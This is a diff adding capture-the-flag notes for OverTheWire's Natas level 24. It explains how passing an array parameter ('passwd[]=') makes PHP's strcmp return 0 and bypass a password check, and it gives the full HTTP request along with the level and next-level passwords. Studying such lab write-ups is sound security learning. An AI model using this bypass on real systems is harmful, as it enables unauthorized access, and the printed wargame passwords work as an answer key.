@@ -1,2 +1,34 @@
 http://natas24.natas.labs.overthewire.org/
 OsRmXFguozKpTZZ5X14zNO43379LZveg
+
+After googling for strcmp php vulnerabilities, we find this:
+
+https://hydrasky.com/network-security/php-string-comparison-vulnerabilities/
+
+
+"If we request with cookie token is an array to pass an array instead of a string to strcmp(),
+it will gives a warning (‘WARNING strcmp() expects parameter 2 to be string,
+array given on line number …!’) but the compare result return 0.
+
+This request look like:
+GET / HTTP 1.1
+Host: example.com
+Cookie: token[]=''
+.....
+=> $_COOKIE[‘token’] = array( 0 => “”);
+strcmp(array( 0 => “”), “0a37bd1f669d8bb5eae47ef80013e4d3d8287c11”) will return 0.
+=> authentication passed."
+
+Sends this request and it works:
+GET /?passwd[]= HTTP/1.1
+Host: natas24.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Authorization: Basic <censored>
+Connection: close
+Cookie: __utma=176859643.1352357629.1604541629.1604541629.1604541629.1; __utmz=176859643.1604541629.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)
+Upgrade-Insecure-Requests: 1
+
+GHF6X7YwACaYYssHVY05cFq83hRktl4c
